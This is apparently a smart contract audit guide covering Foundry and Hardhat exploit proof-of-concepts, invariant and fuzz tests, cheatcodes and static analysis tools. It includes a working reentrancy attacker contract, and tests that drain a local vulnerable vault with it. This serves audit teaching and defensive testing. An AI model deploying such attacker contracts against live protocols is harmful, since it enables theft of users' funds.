# Security Testing & Tooling Guide

How to write exploit PoCs, invariant tests, and fuzz tests for smart contract auditing using Foundry and Hardhat.

---

## Foundry (Forge) — Primary Audit Tooling

### Setting Up an Exploit PoC

```solidity
// test/exploits/ExploitReentrancy.t.sol
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract AttackerContract {
    VulnerableVault vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 5 && address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }
}

contract ExploitReentrancyTest is Test {
    VulnerableVault vault;
    AttackerContract attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new VulnerableVault();

        // Seed the vault with victim funds
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        attacker = new AttackerContract(address(vault));
    }

    function testReentrancyExploit() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        assertEq(vaultBalanceBefore, 10 ether);

        // Attacker deposits 1 ETH and exploits reentrancy
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        // Vault should be drained
        assertLt(address(vault).balance, 1 ether, "Vault not drained - reentrancy failed");
        assertGt(address(attacker).balance, 10 ether, "Attacker didn't profit");

        emit log_named_uint("Vault balance after exploit", address(vault).balance);
        emit log_named_uint("Attacker balance after exploit", address(attacker).balance);
    }
}
```

### Flash Loan Exploit PoC Template

```solidity
// test/exploits/ExploitFlashLoan.t.sol
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@aave/v3-core/contracts/interfaces/IPool.sol";

contract FlashLoanExploitTest is Test {
    // Fork mainnet for realistic testing
    uint256 mainnetFork;

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"));
        vm.selectFork(mainnetFork);
    }

    function testFlashLoanExploit() public {
        // 1. Deploy attacker contract
        // 2. Execute flash loan
        // 3. In callback: manipulate price / exploit logic
        // 4. Repay flash loan
        // 5. Assert profit
    }
}
```

### Invariant Testing (Stateful Fuzz Testing)

Invariant tests verify properties that should ALWAYS hold, across random sequences of function calls.

```solidity
// test/invariants/VaultInvariant.t.sol
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultHandler is Test {
    Vault vault;
    address[] public actors;
    uint256 public ghost_depositSum;
    uint256 public ghost_withdrawSum;

    constructor(Vault _vault) {
        vault = _vault;
        actors.push(makeAddr("actor1"));
        actors.push(makeAddr("actor2"));
        actors.push(makeAddr("actor3"));
    }

    function deposit(uint256 actorIndex, uint256 amount) public {
        actorIndex = bound(actorIndex, 0, actors.length - 1);
        amount = bound(amount, 0.01 ether, 100 ether);
        address actor = actors[actorIndex];

        vm.deal(actor, amount);
        vm.prank(actor);
        vault.deposit{value: amount}();
        ghost_depositSum += amount;
    }

    function withdraw(uint256 actorIndex, uint256 amount) public {
        actorIndex = bound(actorIndex, 0, actors.length - 1);
        address actor = actors[actorIndex];
        uint256 balance = vault.balanceOf(actor);
        if (balance == 0) return;

        amount = bound(amount, 1, balance);
        vm.prank(actor);
        vault.withdraw(amount);
        ghost_withdrawSum += amount;
    }
}

contract VaultInvariantTest is Test {
    Vault vault;
    VaultHandler handler;

    function setUp() public {
        vault = new Vault();
        handler = new VaultHandler(vault);

        // Tell Foundry which contract to call randomly
        targetContract(address(handler));
    }

    /// @dev Vault balance should always equal deposits - withdrawals
    function invariant_solvency() public view {
        assertGe(
            address(vault).balance,
            handler.ghost_depositSum() - handler.ghost_withdrawSum(),
            "INVARIANT VIOLATION: vault is insolvent"
        );
    }

    /// @dev No individual user can withdraw more than they deposited
    function invariant_noFreeETH() public view {
        // Check ghost variables tracking per-user balances
    }

    /// @dev Total shares should always be proportional to total assets
    function invariant_shareRatio() public view {
        if (vault.totalSupply() == 0) return;
        // shares/assets ratio should be bounded
        uint256 ratio = (vault.totalAssets() * 1e18) / vault.totalSupply();
        assertGt(ratio, 0.9e18, "Share ratio too low");
        assertLt(ratio, 1.1e18, "Share ratio too high");
    }
}
```

### Fuzz Testing for Edge Cases

```solidity
contract FuzzTest is Test {
    Vault vault;

    function setUp() public {
        vault = new Vault();
    }

    /// @dev Fuzz deposit amounts — should never allow 0-share deposits
    function testFuzz_depositNeverZeroShares(uint256 amount) public {
        amount = bound(amount, 1, 1000 ether);
        vm.deal(address(this), amount);

        uint256 shares = vault.deposit{value: amount}();
        assertGt(shares, 0, "Got 0 shares for non-zero deposit");
    }

    /// @dev Fuzz withdraw — should never return more than deposited
    function testFuzz_withdrawNeverProfitable(uint256 depositAmt, uint256 withdrawAmt) public {
        depositAmt = bound(depositAmt, 1 ether, 100 ether);
        vm.deal(address(this), depositAmt);
        vault.deposit{value: depositAmt}();

        withdrawAmt = bound(withdrawAmt, 0, vault.balanceOf(address(this)));
        uint256 received = vault.withdraw(withdrawAmt);

        assertLe(received, depositAmt, "Withdraw exceeded deposit");
    }
}
```

### Forge Cheatcodes for Auditing

```solidity
// Fork mainnet at specific block
vm.createFork("https://eth-mainnet.g.alchemy.com/v2/KEY", 18000000);

// Impersonate any address
vm.prank(targetAddress);
vm.startPrank(targetAddress);

// Set block properties
vm.warp(block.timestamp + 1 days);  // Time travel
vm.roll(block.number + 100);        // Block advance

// Fund an address
vm.deal(attacker, 1000 ether);
deal(address(token), attacker, 1000000e18);  // ERC20

// Expect reverts
vm.expectRevert("Insufficient balance");
vault.withdraw(tooMuch);

// Snapshot and revert state
uint256 snapshot = vm.snapshot();
// ... do stuff ...
vm.revertTo(snapshot);  // Reset state

// Read storage slots directly
bytes32 value = vm.load(address(target), bytes32(uint256(0)));

// Label addresses for better traces
vm.label(address(vault), "Vault");
vm.label(attacker, "Attacker");

// Inspect storage layout
// Run: forge inspect Contract storage-layout
```

### Running Tests

```bash
# Run all tests with verbose output
forge test -vvvv

# Run specific exploit test
forge test --match-test testReentrancyExploit -vvvv

# Run invariant tests (more iterations = better coverage)
forge test --match-test invariant_ -vvvv --fuzz-runs 10000

# Fork mainnet
forge test --fork-url $ETH_RPC_URL -vvvv

# Gas report
forge test --gas-report

# Inspect storage layout (detect proxy collision risks)
forge inspect src/MyContract.sol:MyContract storage-layout --pretty
```

---

## Hardhat — Alternative Testing

### Exploit PoC with Hardhat

```typescript
// test/exploits/reentrancy.test.ts
import { ethers } from "hardhat";
import { expect } from "chai";

describe("Reentrancy Exploit", function () {
  it("should drain vault via reentrancy", async function () {
    const [deployer, victim, attacker] = await ethers.getSigners();

    // Deploy vulnerable vault
    const Vault = await ethers.getContractFactory("VulnerableVault");
    const vault = await Vault.deploy();

    // Victim deposits
    await vault.connect(victim).deposit({ value: ethers.parseEther("10") });

    // Deploy attacker contract
    const Attacker = await ethers.getContractFactory("AttackerContract");
    const attackerContract = await Attacker.connect(attacker).deploy(vault.target);

    // Execute exploit
    await attackerContract.connect(attacker).attack({ value: ethers.parseEther("1") });

    // Verify drain
    const vaultBalance = await ethers.provider.getBalance(vault.target);
    expect(vaultBalance).to.be.lt(ethers.parseEther("1"));
  });
});
```

### Mainnet Forking with Hardhat

```typescript
// hardhat.config.ts
const config: HardhatUserConfig = {
  networks: {
    hardhat: {
      forking: {
        url: process.env.ETH_RPC_URL!,
        blockNumber: 18000000, // Pin block for reproducibility
      },
    },
  },
};

// In test:
it("should exploit on mainnet fork", async function () {
  // Impersonate a whale
  await network.provider.request({
    method: "hardhat_impersonateAccount",
    params: ["0xWhaleAddress"],
  });
  const whale = await ethers.getSigner("0xWhaleAddress");

  // Execute exploit using real mainnet state
});
```

---

## Static Analysis Tools

### Slither

```bash
# Run on entire project
slither .

# Run specific detectors
slither . --detect reentrancy-eth,reentrancy-no-eth,controlled-delegatecall

# Print contract summary
slither . --print contract-summary

# Check for upgradability issues
slither . --detect unprotected-upgrade

# Export results as JSON
slither . --json output.json

# Key detectors for auditing:
# reentrancy-eth, reentrancy-no-eth, reentrancy-benign
# arbitrary-send-eth, arbitrary-send-erc20
# controlled-delegatecall
# unprotected-upgrade
# suicidal
# unchecked-transfer
# locked-ether
# shadowing-state
# uninitialized-state
```

### Aderyn (Rust-based, fast)

```bash
# Install
cargo install aderyn

# Run analysis
aderyn .

# Output: report.md with findings
```

### Mythril (Symbolic Execution)

```bash
# Analyze a contract
myth analyze src/Contract.sol

# With specific analysis timeout
myth analyze src/Contract.sol --execution-timeout 300

# Check specific vulnerability
myth analyze src/Contract.sol --modules reentrancy
```

---

## Audit Workflow: Combining Tools

```bash
# 1. Static analysis first (fast, catches low-hanging fruit)
slither . --detect reentrancy-eth,arbitrary-send-eth,unprotected-upgrade
aderyn .

# 2. Check storage layout for proxy contracts
forge inspect src/MyContractV1.sol:MyContractV1 storage-layout --pretty
forge inspect src/MyContractV2.sol:MyContractV2 storage-layout --pretty
# Compare manually — look for slot shifts

# 3. Run existing test suite
forge test -vvv

# 4. Write invariant tests for key properties
forge test --match-test invariant_ -vvvv --fuzz-runs 10000

# 5. Write exploit PoCs for findings
forge test --match-test testExploit -vvvv

# 6. Fork mainnet for realistic testing
forge test --fork-url $ETH_RPC_URL --match-test testMainnetExploit -vvvv
```

---

## Common Invariants to Test

| Protocol Type | Invariant | What Violation Means |
|--------------|-----------|---------------------|
| **Vault/ERC4626** | `totalAssets >= totalShares * minRatio` | Share inflation attack |
| **Vault/ERC4626** | `deposit → withdraw cycle never profits` | Rounding exploit |
| **Lending** | `sum(debt) <= sum(collateral * LTV)` | Bad debt / insolvency |
| **Lending** | `health factor < 1 → liquidatable` | Liquidation logic broken |
| **AMM** | `x * y >= k` (after every swap) | Invariant violation |
| **AMM** | `sum(LP tokens) proportional to reserves` | LP token manipulation |
| **Token** | `sum(balances) == totalSupply` | Mint/burn accounting error |
| **Staking** | `rewards distributed <= rewards available` | Reward inflation |
| **Bridge** | `minted on L2 <= locked on L1` | Bridge insolvency |
| **Governance** | `voting power == checkpointed balance` | Flash loan governance |

---

## Security Checklist Before Deployment

```bash
# 1. All tests pass
forge test

# 2. No critical/high slither findings
slither . --filter-paths "test|script|lib"

# 3. Storage layout verified for upgradeable contracts
forge inspect Contract storage-layout --pretty

# 4. Gas usage within limits
forge test --gas-report

# 5. Invariant tests pass with high iteration count
forge test --match-test invariant_ --fuzz-runs 50000

# 6. Coverage report (aim for >90% on critical paths)
forge coverage

# 7. Mainnet fork tests pass
forge test --fork-url $ETH_RPC_URL
```
